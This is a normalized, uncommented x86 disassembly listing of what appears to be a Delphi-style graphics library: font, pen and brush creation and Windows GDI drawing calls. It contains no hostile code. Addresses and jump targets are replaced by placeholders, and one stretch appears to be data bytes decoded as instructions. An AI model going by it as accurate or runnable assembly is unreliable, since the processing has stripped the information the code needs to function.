mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4237fc
xor eax eax
push ebp
push sub_423a7c
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423a83
mov eax [ ebp - 0x4 ]
call sub_423808
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_4034a4
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4238f8
sub_423a8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4237fc
xor edx edx
push ebp
push sub_423aeb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423af2
mov eax [ ebp - 0x4 ]
call sub_423808
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_423af8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_418cd4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_423b95
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4188d4
mov ebx eax
mov eax ebx
call sub_425154
inc [ ebp - 0x4 ]
mov eax ebx
call sub_425590
mov eax [ rw-data ]
call sub_423a8c
mov eax [ rw-data ]
call sub_423a8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423b9c
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_418d38
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4188d4
call sub_425444
inc esi
dec ebx
jne r-xdata
sub_4241eb
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_4181f8
retn
sub_42421c
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402dbc
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402bac
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_4242d0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_423814
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_424324
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_4238f8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_424368
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418f24
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_424028
xor eax eax
push ebp
push sub_424423
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_424028
xor eax eax
push ebp
push sub_424406
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_423a20
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4244a4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42440d
mov eax [ ebp - 0x8 ]
call sub_424038
retn
mov eax ebx
call sub_424728
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_424744
sub_424454
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_424028
xor eax eax
push ebp
push sub_424499
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4239a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4244a0
mov eax [ ebp - 0x4 ]
call sub_424038
retn
sub_4244b8
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_424641
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424648
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_40405c
retn
mov eax [ rw-data ]
call sub_4237fc
xor eax eax
push ebp
push sub_424619
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_423808
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_40429c
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_408ad8
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_40429c
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_408ad8
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_40429c
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_40810c
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_42479c
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_424660
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_42421c
mov edx esp
mov eax ebx
call sub_424454
add esp 0x2c
pop esi
pop ebx
retn
sub_42468c
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_42443c
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_424454
add esp 0x2c
pop esi
pop ebx
retn
sub_4246cc
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_42443c
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402cbc
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_4042d4
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402bac
mov edx esp
mov eax ebx
call sub_424454
sub_424744
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_42468c
pop esi
pop ebx
retn
sub_424770
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_42443c
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_424454
add esp 0x30
pop ebx
retn
sub_4247a4
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_42443c
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_424454
add esp 0x2c
pop esi
pop ebx
retn
sub_4247d4
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_42443c
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_424454
add esp 0x2c
pop esi
pop ebx
retn
sub_4247fc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_423814
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_424840
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_4238f8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_424868
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418f24
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_424028
xor eax eax
push ebp
push sub_424907
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_424028
xor eax eax
push ebp
push sub_4248ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_423a20
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_424a50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4248f1
mov eax [ ebp - 0x8 ]
call sub_424038
retn
sub_424920
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_424938
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_424028
xor eax eax
push ebp
push sub_42497d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4239a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424984
mov eax [ ebp - 0x4 ]
call sub_424038
retn
sub_424990
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_424920
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_424938
add esp 0x10
pop esi
pop ebx
retn
sub_4249b8
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_4237fc
xor eax eax
push ebp
push sub_424a3e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_423808
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_423fe4
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_424a6c
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_424920
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_424938
add esp 0x10
pop esi
pop ebx
retn
sub_424a9c
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_424920
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_424938
sub_424ac8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_423814
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_424b08
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_4238f8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_424b30
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418f24
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_424028
xor eax eax
push ebp
push sub_424bc0
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_424028
xor eax eax
push ebp
push sub_424ba3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_423a20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424baa
mov eax [ ebp - 0x8 ]
call sub_424038
retn
sub_424bd8
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_424bf4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_424028
xor eax eax
push ebp
push sub_424c39
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4239a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424c40
mov eax [ ebp - 0x4 ]
call sub_424038
retn
sub_424c44
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_424bf4
add esp 0x10
pop edi
pop esi
retn
sub_424c70
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_424bd8
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_424bf4
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_424ca4
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_4237fc
xor edx edx
push ebp
push sub_424d71
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_423808
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_423fe4
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_424d8c
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_424bd8
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_424bf4
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_424dc0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
push esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4247fc
mov ecx eax
xor edx edx
mov eax edi
call sub_41927c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_424e08
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
push esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_424ac8
mov ecx eax
xor edx edx
mov eax edi
call sub_41927c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_424e50
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403278
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_4242d0
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_4257b8
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4247fc
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_4257d8
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424ac8
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_4257f8
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_418c4c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_424f14
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_418ce8
xor edx edx
mov eax esi
call sub_4255f0
mov eax [ esi + 0xc ]
call sub_4032a8
mov eax [ esi + 0x10 ]
call sub_4032a8
mov eax [ esi + 0x14 ]
call sub_4032a8
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418ef8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_424f70
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425644
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_425644
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_424ff8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425644
mov eax [ ebx + 0x14 ]
call sub_424c68
call sub_423fe4
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423fe4
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_417298
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_4250a4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425644
mov eax [ ebx + 0x14 ]
call sub_424ca4
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_4250e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425644
mov eax [ ebx + 0x14 ]
call sub_424ca4
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_42511c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425644
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_42517c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_425644
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_4251a8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425644
inc edi
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Polygon
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_4251e0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425644
inc edi
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Polyline
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_425218
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425644
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_425274
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425644
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_4252b0
push ebx
push esi
add esp 0xfffffff8
mov esi eax
xor ebx ebx
test [ esi + 0x54 ] 0x80
je r-xdata
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
push esp
mov eax esi
call sub_425570
push eax
call GetWindowOrgEx
cmp [ esp ] 0x0
je r-xdata
mov bl 0x1
sub_4252dc
push ebp
mov ebp esp
push ecx
push ebx
